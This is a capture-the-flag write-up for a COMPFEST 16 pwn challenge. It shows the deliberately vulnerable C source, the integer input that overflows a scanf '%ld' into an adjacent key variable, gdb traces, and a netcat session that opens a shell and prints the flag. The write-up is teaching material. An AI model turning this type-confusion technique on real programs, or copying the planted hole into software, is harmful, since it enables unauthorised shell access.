# Baby COMPFEST Hope Survey Writeup by Deffreus - CompfestCTF 16

######  Author: NeoZap

## Description

Welcome to Hacker Class CTF COMPFEST 16!
Please fill our form with your hopes of the event.
We will try our best to make it happen!
. . . Wait what did you say?
The form is broken?
Oh welp, it was already broken in the first place 🤪🤪🤪

`nc challenges.ctf.compfest.id 20005`

[chall](https://ctf.compfest.id/files/8b021f2c140e7522c087b0eb21118f51/chall?token=eyJ1c2VyX2lkIjo3MiwidGVhbV9pZCI6MzA3LCJmaWxlX2lkIjo2MX0.ZrHh-w.o5pE3M6PnOou_OCarOEc8o5Dltg) [chall.c](https://ctf.compfest.id/files/044838342630825384efb9b42f5fff8e/chall.c?token=eyJ1c2VyX2lkIjo3MiwidGVhbV9pZCI6MzA3LCJmaWxlX2lkIjo2Mn0.ZrHh-w.iy-niymCzqLKSIJ1KEu3qyVK4PI)

## Files

```
$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=761bc45382457dd85b234cc9c8fc895e693a5b4d, for GNU/Linux 3.2.0, not stripped
```

`chall.c`:

```chall.c
#include <stdio.h>
#include <stdlib.h>

#define BUF_SIZE 0x100

__attribute__((constructor)) _()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("Selamat datang para peserta CTF COMPFEST 16!");
    puts("Sebelum tahap penyisihan, kami ingin mengetahui harapan Anda sebagai peserta kami.");
    puts("Silakan isi form berikut dengan harapan Anda. Terima kasih!");
}

void read_val(const char *msg, void *ptr)
{
    printf("%s", msg);
    scanf("%ld", ptr);
}

int main()
{
    puts("\n===== Form Harapan Peserta CTF COMPFEST 16 =====");

    int key = 0;
    int length;
    read_val("Panjang harapan (biar efisien harap maklum): ", &length);
    if (length < 0 || length >= BUF_SIZE)
    {
        printf("Hayo jangan nackal ya dek...\n");
        return -1;
    }

    if (key == 0xDEADBEEF)
    {
        puts("\nEmang boleh se-hengker ini...");
        system("/bin/sh");
        return 69;
    }

    puts("Mohon maaf saat ini form sedang dalam perbaikan. Silakan coba chall sebelah dulu hehe.");
}
```

## Solution

The main vulnerability here is `read_val`, specifically, the `scanf`.
It read a signed long integer (8 bytes) and write it to `lenght`, an signed integer (4 bytes).
As key and length are declared next to each other,
When the extra 4 bytes overflow from `length`,
they'll go to `key`!

We want to pass `if (key == 0xDEADBEEF)` so that we can get a shell thanks to `system("/bin/sh")`.
Presumably, the flag is on the server.
To do this, we need to use an input that'll overflow `key` with `0xDEADBEEF`.

The input I got it working is: `-2401053092612145152`, or `0xDEADBEEF00000000`.
The main play here is two's complement: `0xDEADBEEF` has `1` as it's most significant bit (`0xd` -> `0b1101`),
so technically `0xDEADBEEF` is a negative number.
The last 4 bytes, `0x00000000` is used to pass `if (length < 0 || length >= BUF_SIZE)`,
so we can reach the second if statement leading to the shell.

The assembly of `main` looks like this:

```asm
   0x000000000040121f <+0>:     push   rbp
   0x0000000000401220 <+1>:     mov    rbp,rsp
   0x0000000000401223 <+4>:     sub    rsp,0x10
   0x0000000000401227 <+8>:     lea    rax,[rip+0xeaa]        # 0x4020d8
   0x000000000040122e <+15>:    mov    rdi,rax
   0x0000000000401231 <+18>:    call   0x401030 <puts@plt>
   0x0000000000401236 <+23>:    mov    DWORD PTR [rbp-0x4],0x0
   0x000000000040123d <+30>:    lea    rax,[rbp-0x8]
   0x0000000000401241 <+34>:    mov    rsi,rax
   0x0000000000401244 <+37>:    lea    rax,[rip+0xec5]        # 0x402110
   0x000000000040124b <+44>:    mov    rdi,rax
   0x000000000040124e <+47>:    call   0x4011d6 <read_val>
   0x0000000000401253 <+52>:    mov    eax,DWORD PTR [rbp-0x8]
   0x0000000000401256 <+55>:    test   eax,eax
   0x0000000000401258 <+57>:    js     0x401264 <main+69>
   0x000000000040125a <+59>:    mov    eax,DWORD PTR [rbp-0x8]
   0x000000000040125d <+62>:    cmp    eax,0xff
   0x0000000000401262 <+67>:    jle    0x40127a <main+91>
   0x0000000000401264 <+69>:    lea    rax,[rip+0xed3]        # 0x40213e
   0x000000000040126b <+76>:    mov    rdi,rax
   0x000000000040126e <+79>:    call   0x401030 <puts@plt>
   0x0000000000401273 <+84>:    mov    eax,0xffffffff
   0x0000000000401278 <+89>:    jmp    0x4012bc <main+157>
   0x000000000040127a <+91>:    cmp    DWORD PTR [rbp-0x4],0xdeadbeef
   0x0000000000401281 <+98>:    jne    0x4012a8 <main+137>
   0x0000000000401283 <+100>:   lea    rax,[rip+0xed6]        # 0x402160
   0x000000000040128a <+107>:   mov    rdi,rax
   0x000000000040128d <+110>:   call   0x401030 <puts@plt>
   0x0000000000401292 <+115>:   lea    rax,[rip+0xee6]        # 0x40217f
   0x0000000000401299 <+122>:   mov    rdi,rax
   0x000000000040129c <+125>:   call   0x401040 <system@plt>
   0x00000000004012a1 <+130>:   mov    eax,0x45
   0x00000000004012a6 <+135>:   jmp    0x4012bc <main+157>
   0x00000000004012a8 <+137>:   lea    rax,[rip+0xed9]        # 0x402188
   0x00000000004012af <+144>:   mov    rdi,rax
   0x00000000004012b2 <+147>:   call   0x401030 <puts@plt>
   0x00000000004012b7 <+152>:   mov    eax,0x0
   0x00000000004012bc <+157>:   leave  
   0x00000000004012bd <+158>:   ret
```

The compare instruction for `key` is at `0x000000000040127a`, so I put a break point there (`b *main+91`).
`gdb` will halt the program when we get there and that'll let us inspect the stack at that time.
With `-2401053092612145152` as input number, here's how it was in `gdb` on that breakpoint:

```
─────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x10              
$rdx   : 0x0               
$rsp   : 0x00007ffdd7da5b70  →  0x0000000000000000
$rbp   : 0x00007ffdd7da5b80  →  0x0000000000000001
$rsi   : 0x2152411100000000
$rdi   : 0x00007ffdd7da5610  →  "-2401053092612145152"
$rip   : 0x000000000040127a  →  <main+005b> cmp DWORD PTR [rbp-0x4], 0xdeadbeef
$r8    : 0x1999999999999999
$r9    : 0x0               
$r10   : 0x00007fc4ef13eac0  →  0x0000000100000000
$r11   : 0x00007fc4ef13f3c0  →  0x0002000200020002
$r12   : 0x00007ffdd7da5c98  →  0x00007ffdd7da6759  →  "/home/d3ffr3u5-picoctf/chall"
$r13   : 0x000000000040121f  →  <main+0000> push rbp
$r14   : 0x0000000000403e00  →  0x0000000000401130  →  <__do_global_dtors_aux+0000> endbr64 
$r15   : 0x00007fc4ef1f8040  →  0x00007fc4ef1f92e0  →  0x0000000000000000
$eflags: [zero CARRY parity ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
─────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffdd7da5b70│+0x0000: 0x0000000000000000   ← $rsp
0x00007ffdd7da5b78│+0x0008: 0xdeadbeef00000000
0x00007ffdd7da5b80│+0x0010: 0x0000000000000001   ← $rbp
0x00007ffdd7da5b88│+0x0018: 0x00007fc4eefa9d90  →  <__libc_start_call_main+0080> mov edi, eax
0x00007ffdd7da5b90│+0x0020: 0x0000000000000000
0x00007ffdd7da5b98│+0x0028: 0x000000000040121f  →  <main+0000> push rbp
0x00007ffdd7da5ba0│+0x0030: 0x0000000100000000
0x00007ffdd7da5ba8│+0x0038: 0x00007ffdd7da5c98  →  0x00007ffdd7da6759  →  "/home/d3ffr3u5-picoctf/chall"
───────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40126e <main+004f>      call   0x401030 <puts@plt>
     0x401273 <main+0054>      mov    eax, 0xffffffff
     0x401278 <main+0059>      jmp    0x4012bc <main+157>
 →   0x40127a <main+005b>      cmp    DWORD PTR [rbp-0x4], 0xdeadbeef
     0x401281 <main+0062>      jne    0x4012a8 <main+137>
     0x401283 <main+0064>      lea    rax, [rip+0xed6]        # 0x402160
     0x40128a <main+006b>      mov    rdi, rax
     0x40128d <main+006e>      call   0x401030 <puts@plt>
     0x401292 <main+0073>      lea    rax, [rip+0xee6]        # 0x40217f
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
(gdb) c
Continuing.
Emang boleh se-hengker ini...
[Detaching after vfork from child process 301]
```

We can see that at `0x00007ffdd7da5b78` or `stack+0x008`,
we have the value `0xDEADBEEF00000000`.
If we continue from here, we should pass the `key` check!
That output mean that we're correct!
Now let's just do it on the real instance:

```
$ nc challenges.ctf.compfest.id 20005                     
Selamat datang para peserta CTF COMPFEST 16!
Sebelum tahap penyisihan, kami ingin mengetahui harapan Anda sebagai peserta kami.
Silakan isi form berikut dengan harapan Anda. Terima kasih!

===== Form Harapan Peserta CTF COMPFEST 16 =====
Panjang harapan (biar efisien harap maklum): -2401053092612145152

Emang boleh se-hengker ini...
ls
Makefile
bin
chall
chall.c
chall_patched
dev
flag.txt
lib
lib32
lib64
libx32
usr
cat flag.txt
COMPFEST16{now_you_know_type_confusion_and_how_dangerous_it_is_61674dad07}
```

We got a shell, then print the content of `flag.txt`!
Yay!

Flag: `COMPFEST16{now_you_know_type_confusion_and_how_dangerous_it_is_61674dad07}`
